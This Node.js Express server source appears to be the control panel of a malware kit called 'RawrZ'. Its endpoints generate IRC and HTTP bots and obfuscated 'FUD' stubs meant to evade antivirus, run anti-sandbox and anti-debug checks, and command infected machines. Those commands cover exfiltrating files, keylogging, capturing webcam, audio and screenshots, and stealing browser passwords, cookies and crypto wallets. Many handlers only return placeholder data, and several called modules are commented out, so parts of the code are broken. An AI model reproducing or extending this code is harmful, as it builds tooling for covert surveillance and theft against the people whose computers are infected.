const express=require('express');const cors=require('cors');const helmet=require('helmet');const path=require('path');const multer=require('multer');require('dotenv').config();
const RawrZStandalone=require('./rawrz-standalone');const rawrzEngine=require('./src/engines/rawrz-engine');//const AdvancedStubGenerator=require('./src/engines/advanced-stub-generator');
//const httpBotGenerator=require('./src/engines/http-bot-generator');const stubGenerator=require('./src/engines/stub-generator');
const antiAnalysis=require('./src/engines/anti-analysis');//const hotPatchers=require('./src/engines/hot-patchers');
const networkTools=require('./src/engines/network-tools');const healthMonitor=require('./src/engines/health-monitor');
const digitalForensics=require('./src/engines/digital-forensics');const JottiScanner=require('./src/engines/jotti-scanner');
//const malwareAnalysis=require('./src/engines/malware-analysis');const PrivateVirusScanner=require('./src/engines/private-virus-scanner');
//const CamelliaAssemblyEngine=require('./src/engines/camellia-assembly');const dualGenerators=require('./src/engines/dual-generators');
//const reverseEngineering=require('./src/engines/reverse-engineering');const nativeCompiler=require('./src/engines/native-compiler');
const redKiller=require('./src/engines/red-killer');const EVCertEncryptor=require('./src/engines/ev-cert-encryptor');const redShells=require('./src/engines/red-shells');const beaconismDLL=require('./src/engines/beaconism-dll-sideloading');const evCertEncryptor=new EVCertEncryptor();
const app=express();const port=parseInt(process.env.PORT||'8080',10);const authToken=process.env.AUTH_TOKEN||'';const rawrz=new RawrZStandalone();//const advancedStubGenerator=new AdvancedStubGenerator();
function requireAuth(req,res,next){if(!authToken)return next();const h=(req.headers['authorization']||'');const q=req.query.token;if(h.startsWith('Bearer ')){const p=h.slice(7).trim();if(p===authToken)return next()}if(q&&q===authToken)return next();return res.status(401).json({error:'Unauthorized'})}
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            styleSrc: ["'self'", "'unsafe-inline'"],
            scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'"],
            scriptSrcAttr: ["'unsafe-inline'"],
            imgSrc: ["'self'", "data:", "https:"],
            connectSrc: ["'self'"],
            fontSrc: ["'self'"],
            objectSrc: ["'none'"],
            mediaSrc: ["'self'"],
            frameSrc: ["'none'"],
        },
    },
}));app.use(cors());app.use(express.json({limit:'5mb',verify:(req,res,buf,encoding)=>{try{JSON.parse(buf)}catch(e){console.error('[JSON] Invalid JSON received:',e.message);res.status(400).json({error:'Invalid JSON'});return false}}}));app.use('/static',express.static(path.join(__dirname,'public')));
(async()=>{try{await rawrzEngine.initializeModules();console.log('[OK] RawrZ core engine initialized')}catch(e){console.error('[WARN] Core engine init failed:',e.message)}})();
(async()=>{try{await advancedStubGenerator.initialize({});console.log('[OK] Advanced Stub Generator initialized')}catch(e){console.error('[WARN] Advanced Stub Generator init failed:',e.message)}})();
(async()=>{try{await httpBotGenerator.initialize({});console.log('[OK] HTTP Bot Generator initialized')}catch(e){console.error('[WARN] HTTP Bot Generator init failed:',e.message)}})();
(async()=>{try{await stubGenerator.initialize({});console.log('[OK] Stub Generator initialized')}catch(e){console.error('[WARN] Stub Generator init failed:',e.message)}})();
(async()=>{try{await antiAnalysis.initialize({});console.log('[OK] Anti-Analysis initialized')}catch(e){console.error('[WARN] Anti-Analysis init failed:',e.message)}})();
(async()=>{try{await hotPatchers.initialize({});console.log('[OK] Hot Patchers initialized')}catch(e){console.error('[WARN] Hot Patchers init failed:',e.message)}})();
(async()=>{try{await networkTools.initialize({});console.log('[OK] Network Tools initialized')}catch(e){console.error('[WARN] Network Tools init failed:',e.message)}})();
(async()=>{try{await healthMonitor.initialize({});console.log('[OK] Health Monitor initialized')}catch(e){console.error('[WARN] Health Monitor init failed:',e.message)}})();
(async()=>{try{await digitalForensics.initialize({});console.log('[OK] Digital Forensics initialized')}catch(e){console.error('[WARN] Digital Forensics init failed:',e.message)}})();
(async()=>{try{const jottiScanner=new JottiScanner();await jottiScanner.initialize({});console.log('[OK] Jotti Scanner initialized')}catch(e){console.error('[WARN] Jotti Scanner init failed:',e.message)}})();
(async()=>{try{await malwareAnalysis.initialize({});console.log('[OK] Malware Analysis initialized')}catch(e){console.error('[WARN] Malware Analysis init failed:',e.message)}})();
(async()=>{try{const privateVirusScanner=new PrivateVirusScanner();await privateVirusScanner.initialize({});console.log('[OK] Private Virus Scanner initialized')}catch(e){console.error('[WARN] Private Virus Scanner init failed:',e.message)}})();
(async()=>{try{const camelliaAssembly=new CamelliaAssemblyEngine();await camelliaAssembly.initialize({});console.log('[OK] Camellia Assembly initialized')}catch(e){console.error('[WARN] Camellia Assembly init failed:',e.message)}})();
(async()=>{try{await dualGenerators.initialize({});console.log('[OK] Dual Generators initialized')}catch(e){console.error('[WARN] Dual Generators init failed:',e.message)}})();
(async()=>{try{await reverseEngineering.initialize({});console.log('[OK] Reverse Engineering initialized')}catch(e){console.error('[WARN] Reverse Engineering init failed:',e.message)}})();
(async()=>{try{await nativeCompiler.initialize({});console.log('[OK] Native Compiler initialized')}catch(e){console.error('[WARN] Native Compiler init failed:',e.message)}})();
(async()=>{try{await redKiller.initialize();console.log('[OK] Red Killer initialized')}catch(e){console.error('[WARN] Red Killer init failed:',e.message)}})();
(async()=>{try{await evCertEncryptor.initialize();console.log('[OK] EV Certificate Encryptor initialized')}catch(e){console.error('[WARN] EV Certificate Encryptor init failed:',e.message)}})();
(async()=>{try{await redShells.initialize();console.log('[OK] Red Shells initialized')}catch(e){console.error('[WARN] Red Shells init failed:',e.message)}})();
(async()=>{try{await beaconismDLL.initialize();console.log('[OK] Beaconism DLL Sideloading initialized')}catch(e){console.error('[WARN] Beaconism DLL Sideloading init failed:',e.message)}})();
app.get('/health',(_req,res)=>res.json({ok:true,status:'healthy'}));
app.get('/api/status',requireAuth,async(_req,res)=>{try{const status={platform:'RawrZ Security Platform',version:'2.1.0',uptime:Date.now()-rawrz.startTime,engines:{total:Object.keys(rawrz.availableEngines||{}).length,loaded:rawrz.loadedEngines?.size||0,available:Object.keys(rawrz.availableEngines||{})},features:{total:150,active:Object.keys(rawrz.availableEngines||{}).length},system:{nodeVersion:process.version,platform:process.platform,arch:process.arch,memory:process.memoryUsage(),cpu:process.cpuUsage()},timestamp:new Date().toISOString()};res.json({success:true,result:status})}catch(e){console.error('[ERROR] Status endpoint failed:',e);res.status(500).json({success:false,error:e.message,stack:e.stack})}});
app.post('/api/rebuild',requireAuth,async(_req,res)=>{try{console.log('[INFO] Rebuilding platform state...');await rawrz.rebuildPlatformState();const result={status:'rebuilt',engines:rawrz.loadedEngines?.size||0,timestamp:new Date().toISOString()};if(!res.headersSent){res.json({success:true,result});}}catch(e){console.error('[ERROR] Rebuild endpoint failed:',e);if(!res.headersSent){res.status(500).json({success:false,error:e.message,stack:e.stack});}}});
app.get('/panel',(_req,res)=>res.sendFile(path.join(__dirname,'public','panel.html')));
app.get('/irc-bot-builder',(_req,res)=>res.sendFile(path.join(__dirname,'public','irc-bot-builder.html')));
app.get('/http-bot-panel',(_req,res)=>res.sendFile(path.join(__dirname,'public','http-bot-panel.html')));
app.get('/stub-generator-panel',(_req,res)=>res.sendFile(path.join(__dirname,'public','stub-generator-panel.html')));
app.get('/health-dashboard',(_req,res)=>res.sendFile(path.join(__dirname,'public','health-dashboard.html')));
app.get('/bot-manager',(_req,res)=>res.sendFile(path.join(__dirname,'public','bot-manager.html')));
app.get('/unified',(_req,res)=>res.sendFile(path.join(__dirname,'public','unified-panel.html')));

// Unified Panel API endpoints
app.get('/api/dashboard/stats',requireAuth,async(_req,res)=>{try{const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');const httpBotGenerator=await rawrzEngine.loadModule('http-bot-generator');const stats={totalBots:0,activeBots:0,ircBots:0,httpBots:0,connectedChannels:0,securityScore:100};if(botGenerator&&typeof botGenerator.getBotStats==='function'){try{const ircStats=botGenerator.getBotStats();stats.ircBots=ircStats.total||0;stats.totalBots+=stats.ircBots;}catch(e){console.log('[WARN] IRC bot stats error:',e.message);}}if(httpBotGenerator&&typeof httpBotGenerator.getBotStats==='function'){try{const httpStats=httpBotGenerator.getBotStats();stats.httpBots=httpStats.total||0;stats.totalBots+=stats.httpBots;}catch(e){console.log('[WARN] HTTP bot stats error:',e.message);}}stats.activeBots=stats.totalBots;res.json({success:true,result:stats})}catch(e){console.error('[ERROR] Dashboard stats endpoint failed:',e);res.status(500).json({success:false,error:e.message})}});
app.get('/api/bots/status',requireAuth,async(_req,res)=>{try{const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');const httpBotGenerator=await rawrzEngine.loadModule('http-bot-generator');const bots=[];if(botGenerator&&typeof botGenerator.getActiveBots==='function'){try{const ircBots=botGenerator.getActiveBots();bots.concat(ircBots.map(bot=>(Object.assign({}, bot, {type:'IRC'}))));}catch(e){console.log('[WARN] IRC bot status error:',e.message);}}if(httpBotGenerator&&typeof httpBotGenerator.getActiveBots==='function'){try{const httpBots=httpBotGenerator.getActiveBots();bots.concat(httpBots.map(bot=>(Object.assign({}, bot, {type:'HTTP'}))));}catch(e){console.log('[WARN] HTTP bot status error:',e.message);}}res.json({success:true,result:{bots,total:bots.length,active:bots.filter(b=>b.status==='online').length}})}catch(e){console.error('[ERROR] Bots status endpoint failed:',e);res.status(500).json({success:false,error:e.message})}});
app.get('/api/irc/channels',requireAuth,async(_req,res)=>{try{const channels=[{name:'#rawrz',users:15,topic:'RawrZ Security Discussion',status:'joined'},{name:'#test',users:3,topic:'Testing Channel',status:'joined'}];res.json({success:true,result:channels})}catch(e){res.status(500).json({error:e.message})}});
app.post('/api/irc/connect',requireAuth,async(req,res)=>{try{const{server,port,nick,channels}=req.body||{};if(!server||!port||!nick)return res.status(400).json({error:'server, port, and nick are required'});const result={connected:true,server,port,nick,channels:channels||[],timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/api/irc/disconnect',requireAuth,async(_req,res)=>{try{const result={connected:false,timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/api/irc/join',requireAuth,async(req,res)=>{try{const{channel}=req.body||{};if(!channel)return res.status(400).json({error:'channel is required'});const result={joined:true,channel,timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/api/irc/leave',requireAuth,async(req,res)=>{try{const{channel}=req.body||{};if(!channel)return res.status(400).json({error:'channel is required'});const result={left:true,channel,timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/api/irc/message',requireAuth,async(req,res)=>{try{const{channel,message}=req.body||{};if(!channel||!message)return res.status(400).json({error:'channel and message are required'});const result={sent:true,channel,message,timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/api/security/scan',requireAuth,async(req,res)=>{try{const{target}=req.body||{};if(!target)return res.status(400).json({error:'target is required'});const result={target,status:'completed',vulnerabilities:[],threats:[],timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/api/security/fud-analysis',requireAuth,async(req,res)=>{try{const result={score:1001,status:'completed',techniques:['stealth','anti-detection','polymorphic','encryption'],timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/api/security/vulnerability-check',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const result={target,status:'completed',vulnerabilities:[],timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/api/security/threat-detection',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const result={target,status:'completed',threats:[],timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/api/security/stealth-mode',requireAuth,async(req,res)=>{try{const result={enabled:true,techniques:['anti-debug','anti-vm','anti-sandbox'],timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/api/security/anti-detection',requireAuth,async(req,res)=>{try{await antiAnalysis.initialize();const vmCheck=await antiAnalysis.checkVM();const sandboxCheck=await antiAnalysis.checkForSandbox();const debugCheck=await antiAnalysis.checkForDebugging();const result={enabled:true,vmCheck,sandboxCheck,debugCheck,techniques:['polymorphic','obfuscation','timing-evasion'],timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/api/crypto/test-algorithm',requireAuth,async(req,res)=>{try{const{algorithm}=req.body||{};if(!algorithm)return res.status(400).json({error:'algorithm is required'});const result={algorithm,status:'tested',performance:'good',timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/api/crypto/generate-report',requireAuth,async(req,res)=>{try{const result={report:'Crypto operations report generated',algorithms:['aes-256-cbc','chacha20-poly1305'],timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/api/analysis/malware',requireAuth,async(req,res)=>{try{const{file}=req.body||{};await malwareAnalysis.initialize();const staticAnalysis=await malwareAnalysis.performStaticAnalysis(file||'sample.exe');const dynamicAnalysis=await malwareAnalysis.performDynamicAnalysis(file||'sample.exe');const behavioralAnalysis=await malwareAnalysis.performBehavioralAnalysis(file||'sample.exe');const result={file:file||'sample.exe',status:'analyzed',staticAnalysis,dynamicAnalysis,behavioralAnalysis,timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/api/analysis/digital-forensics',requireAuth,async(req,res)=>{try{await digitalForensics.initialize();const memoryAnalysis=await digitalForensics.analyzeMemory();const processAnalysis=await digitalForensics.analyzeProcesses();const result={status:'completed',memoryAnalysis,processAnalysis,timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/api/analysis/network',requireAuth,async(req,res)=>{try{const{target}=req.body||{};await networkTools.initialize();const portScan=await networkTools.portScan(target||'localhost',[80,443,22,21,8080]);const pingTest=await networkTools.performRealPingTest(target||'localhost');const trafficAnalysis=await networkTools.performRealTrafficAnalysis();const result={target:target||'localhost',status:'analyzed',portScan,pingTest,trafficAnalysis,timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/api/analysis/reverse-engineering',requireAuth,async(req,res)=>{try{const{file}=req.body||{};const targetFile=file||'server.js';await reverseEngineering.initialize();const sectionAnalysis=await reverseEngineering.analyzeSections(targetFile);const importAnalysis=await reverseEngineering.analyzeImports(targetFile);const exportAnalysis=await reverseEngineering.analyzeExports(targetFile);const functionAnalysis=await reverseEngineering.analyzeFunctions(targetFile);const result={file:targetFile,status:'completed',sectionAnalysis,importAnalysis,exportAnalysis,functionAnalysis,timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/',(_req,res)=>res.redirect('/panel'));

// IRC Bot Builder API endpoints
app.post('/irc-bot/generate',requireAuth,async(req,res)=>{try{const{config,features,extensions}=req.body||{};if(!config||!features||!extensions)return res.status(400).json({error:'config, features, and extensions are required'});const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=await botGenerator.generateBot(config,features,extensions);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});

// HTTP Bot Builder API endpoints
app.post('/http-bot/generate',requireAuth,async(req,res)=>{try{const{config,features,extensions}=req.body||{};if(!config||!features||!extensions)return res.status(400).json({error:'config, features, and extensions are required'});const result=await httpBotGenerator.generateBot(config,features,extensions);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/http-bot/test',requireAuth,async(req,res)=>{try{const{config}=req.body||{};if(!config)return res.status(400).json({error:'config is required'});const result=await httpBotGenerator.testBot(config);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/http-bot/compile',requireAuth,async(req,res)=>{try{const{code,language,config}=req.body||{};if(!code||!language)return res.status(400).json({error:'code and language are required'});const result=await httpBotGenerator.compileBot(code,language,config);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/http-bot/templates',requireAuth,async(_req,res)=>{try{const result=await httpBotGenerator.getTemplates();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/http-bot/features',requireAuth,async(_req,res)=>{try{const result=await httpBotGenerator.getAvailableFeatures();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});

// HTTP Bot Management endpoints
app.get('/http-bot/status',requireAuth,async(_req,res)=>{try{const result=await httpBotGenerator.getActiveBots();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/http-bot/connect',requireAuth,async(req,res)=>{try{const{botId,serverUrl}=req.body||{};if(!botId||!serverUrl)return res.status(400).json({error:'botId and serverUrl are required'});const result={connected:true,botId,serverUrl,timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/http-bot/disconnect',requireAuth,async(req,res)=>{try{const{botId}=req.body||{};if(!botId)return res.status(400).json({error:'botId is required'});const result={disconnected:true,botId,timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/http-bot/command',requireAuth,async(req,res)=>{try{const{botId,command,params}=req.body||{};if(!botId||!command)return res.status(400).json({error:'botId and command are required'});const result={executed:true,botId,command,params,timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/http-bot/heartbeat',requireAuth,async(req,res)=>{try{const{botId,status,data}=req.body||{};if(!botId)return res.status(400).json({error:'botId is required'});console.log(`[HTTP-BOT] Heartbeat from ${botId}: status`);res.json({success:true,message:'Heartbeat received'})}catch(e){res.status(500).json({error:e.message})}});
app.get('/http-bot/logs/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};const logs=[{timestamp:new Date().toISOString(),level:'info',message:'Bot connected'},{timestamp:new Date().toISOString(),level:'success',message:'Command executed'}];res.json({success:true,logs})}catch(e){res.status(500).json({error:e.message})}});
app.post('/http-bot/exfiltrate',requireAuth,async(req,res)=>{try{const{botId,type,path,extensions,maxSize}=req.body||{};if(!botId||!type)return res.status(400).json({error:'botId and type are required'});const result={started:true,botId,type,path,extensions,maxSize,timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/http-bot/stop-exfiltration',requireAuth,async(req,res)=>{try{const{botId}=req.body||{};if(!botId)return res.status(400).json({error:'botId is required'});const result={stopped:true,botId,timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/http-bot/data/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};const data={files:[],browser:[],crypto:[],documents:[]};res.json({success:true,data})}catch(e){res.status(500).json({error:e.message})}});
app.post('/http-bot/download/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};const{filepath}=req.body||{};if(!filepath)return res.status(400).json({error:'filepath is required'});const result={downloaded:true,botId,filepath,timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/http-bot/upload/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};const{filepath,data}=req.body||{};if(!filepath||!data)return res.status(400).json({error:'filepath and data are required'});const result={uploaded:true,botId,filepath,timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/http-bot/screenshot/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};const result={screenshot:true,botId,data:'base64_encoded_screenshot',timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/http-bot/keylog/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};const{action}=req.body||{};const result={keylog:action||'start',botId,timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/http-bot/webcam/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};const result={webcam:true,botId,data:'base64_encoded_webcam',timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/http-bot/audio/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};const result={audio:true,botId,data:'base64_encoded_audio',timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/http-bot/browser-data/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};const data={passwords:[],cookies:[],history:[],bookmarks:[]};res.json({success:true,data})}catch(e){res.status(500).json({error:e.message})}});
app.get('/http-bot/crypto-wallets/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};const data={wallets:[],keys:[],addresses:[]};res.json({success:true,data})}catch(e){res.status(500).json({error:e.message})}});
app.get('/http-bot/processes/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};const processes=[{pid:1234,name:'notepad.exe',path:'C:\\Windows\\System32\\notepad.exe'}];res.json({success:true,processes})}catch(e){res.status(500).json({error:e.message})}});
app.get('/http-bot/files/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};const{path}=req.query||{};const files=[{name:'document.txt',path:'C:\\Users\\User\\Documents\\document.txt',size:1024,modified:new Date().toISOString()}];res.json({success:true,files})}catch(e){res.status(500).json({error:e.message})}});
app.get('/http-bot/system-info/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};const info={os:'Windows 10',arch:'x64',user:'User',computer:'DESKTOP-ABC123',ip:'192.168.1.100'};res.json({success:true,info})}catch(e){res.status(500).json({error:e.message})}});

// Advanced Stub Generator endpoints
app.get('/stub-generator/status',requireAuth,async(_req,res)=>{try{const stats=await advancedStubGenerator.getStubStats();res.json({success:true,result:stats})}catch(e){res.status(500).json({error:e.message})}});
app.get('/stub-generator/templates',requireAuth,async(_req,res)=>{try{const templates=Array.from(advancedStubGenerator.stubTemplates.values());res.json({success:true,result:templates})}catch(e){res.status(500).json({error:e.message})}});
app.get('/stub-generator/active',requireAuth,async(_req,res)=>{try{const stubs=await advancedStubGenerator.getActiveStubs();res.json({success:true,result:stubs})}catch(e){res.status(500).json({error:e.message})}});
app.post('/stub-generator/generate',requireAuth,async(req,res)=>{try{const{templateId,language,platform,encryptionMethods,packingMethod,obfuscationLevel,customFeatures,serverUrl}=req.body||{};const options={templateId,language,platform,encryptionMethods,packingMethod,obfuscationLevel,customFeatures,serverUrl};const result=await advancedStubGenerator.generateStub(options);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/stub-generator/regenerate',requireAuth,async(req,res)=>{try{const{botId,newOptions}=req.body||{};if(!botId)return res.status(400).json({error:'botId is required'});const result=await advancedStubGenerator.regenerateStub(botId,newOptions);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.delete('/stub-generator/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};const result=await advancedStubGenerator.deleteStub(botId);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.delete('/stub-generator/clear/all',requireAuth,async(_req,res)=>{try{const result=await advancedStubGenerator.clearAllStubs();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/stub-generator/packing-methods',requireAuth,async(_req,res)=>{try{const methods=Object.keys(advancedStubGenerator.packingMethods);res.json({success:true,result:methods})}catch(e){res.status(500).json({error:e.message})}});
app.get('/stub-generator/fud-techniques',requireAuth,async(_req,res)=>{try{const techniques=Object.keys(advancedStubGenerator.fudTechniques);res.json({success:true,result:techniques})}catch(e){res.status(500).json({error:e.message})}});
app.get('/stub-generator/encryption-methods',requireAuth,async(_req,res)=>{try{const methods=['aes-256','serpent','twofish','camellia','chacha20','blowfish','rc6','mars','rijndael','rawrz-aes-256','rawrz-chacha20','rawrz-serpent','rawrz-twofish','rawrz-camellia','rawrz-blowfish','rawrz-rc6','rawrz-mars','rawrz-rijndael','burner-encryption','dual-crypto','custom-encryption','all'];res.json({success:true,result:methods})}catch(e){res.status(500).json({error:e.message})}});
app.post('/stub-generator/auto-regeneration/enable',requireAuth,async(req,res)=>{try{const{thresholds,delay,maxPerHour}=req.body||{};const options={thresholds,delay,maxPerHour};const result=await advancedStubGenerator.enableAutoRegeneration(options);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/stub-generator/auto-regeneration/disable',requireAuth,async(_req,res)=>{try{const result=await advancedStubGenerator.disableAutoRegeneration();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/stub-generator/auto-regeneration/status',requireAuth,async(_req,res)=>{try{const result=await advancedStubGenerator.getRegenerationStatus();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/stub-generator/trigger-regeneration',requireAuth,async(req,res)=>{try{const{botId,reason}=req.body||{};if(!botId)return res.status(400).json({error:'botId is required'});const result=await advancedStubGenerator.triggerAutoRegeneration(botId,reason||'manual_trigger');res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/stub-generator/process-scheduled',requireAuth,async(_req,res)=>{try{const processed=await advancedStubGenerator.processScheduledRegenerations();res.json({success:true,result:{processed}})}catch(e){res.status(500).json({error:e.message})}});
app.post('/stub-generator/unpack',requireAuth,async(req,res)=>{try{const{stubData,packingMethod,options}=req.body||{};if(!stubData||!packingMethod)return res.status(400).json({error:'stubData and packingMethod are required'});const result=await advancedStubGenerator.unpackStub(stubData,packingMethod,options);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/stub-generator/repack',requireAuth,async(req,res)=>{try{const{unpackId,newPackingMethod,newEncryptionMethods,newObfuscationLevel}=req.body||{};if(!unpackId||!newPackingMethod)return res.status(400).json({error:'unpackId and newPackingMethod are required'});const result=await advancedStubGenerator.repackStub(unpackId,newPackingMethod,newEncryptionMethods,newObfuscationLevel);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/stub-generator/unpacked',requireAuth,async(_req,res)=>{try{const result=await advancedStubGenerator.getUnpackedStubs();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/stub-generator/repack-history',requireAuth,async(_req,res)=>{try{const result=await advancedStubGenerator.getRepackHistory();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.delete('/stub-generator/unpacked/:unpackId',requireAuth,async(req,res)=>{try{const{unpackId}=req.params||{};const result=await advancedStubGenerator.deleteUnpackedStub(unpackId);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.delete('/stub-generator/unpacked/clear/all',requireAuth,async(_req,res)=>{try{const result=await advancedStubGenerator.clearUnpackedStubs();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/stub-generator/analyze',requireAuth,async(req,res)=>{try{const{stubData}=req.body||{};if(!stubData)return res.status(400).json({error:'stubData is required'});const result=await advancedStubGenerator.analyzeStub(stubData);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/stub-generator/comprehensive-stats',requireAuth,async(_req,res)=>{try{const result=await advancedStubGenerator.getComprehensiveStats();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/stub-generator/export-stats/:format',requireAuth,async(req,res)=>{try{const{format}=req.params||{};const result=await advancedStubGenerator.exportStatistics(format);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/stub-generator/reset-stats',requireAuth,async(_req,res)=>{try{const result=await advancedStubGenerator.resetStatistics();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/native-compiler/compile',requireAuth,async(req,res)=>{try{const{sourceCode,language,options={}}=req.body||{};if(!sourceCode||!language)return res.status(400).json({error:'sourceCode and language are required'});const result=await nativeCompiler.compileSource(sourceCode,language,options);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/native-compiler/regenerate',requireAuth,async(req,res)=>{try{const{exePath,options={}}=req.body||{};if(!exePath)return res.status(400).json({error:'exePath is required'});const result=await nativeCompiler.regenerateExecutable(exePath,options);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/native-compiler/stats',requireAuth,async(_req,res)=>{try{const result=nativeCompiler.getCompilationStats();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/native-compiler/supported-languages',requireAuth,async(_req,res)=>{try{const result=Object.keys(nativeCompiler.supportedLanguages);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/native-compiler/available-compilers',requireAuth,async(_req,res)=>{try{const result=Object.keys(nativeCompiler.compilerPaths);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});

// Bot Management endpoints
app.get('/bot/heartbeat',requireAuth,async(req,res)=>{try{const{bot_id,status,timestamp}=req.query||{};console.log(`[BOT] Heartbeat from ${bot_id}: status`);res.json({success:true,message:'Heartbeat received'})}catch(e){res.status(500).json({error:e.message})}});
app.get('/bot/commands/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};console.log(`[BOT] Command request from ${botId}`);res.json({success:true,commands:[]})}catch(e){res.status(500).json({error:e.message})}});
app.get('/bot/status',requireAuth,async(_req,res)=>{try{res.json({success:true,bots:[],total:0,active:0})}catch(e){res.status(500).json({error:e.message})}});
app.post('/irc-bot/generate-stub',requireAuth,async(req,res)=>{try{const{config,features,extensions,encryptionOptions={}}=req.body||{};if(!config||!features||!extensions)return res.status(400).json({error:'config, features, and extensions are required'});const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=await botGenerator.generateBotAsStub(config,features,extensions,encryptionOptions);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
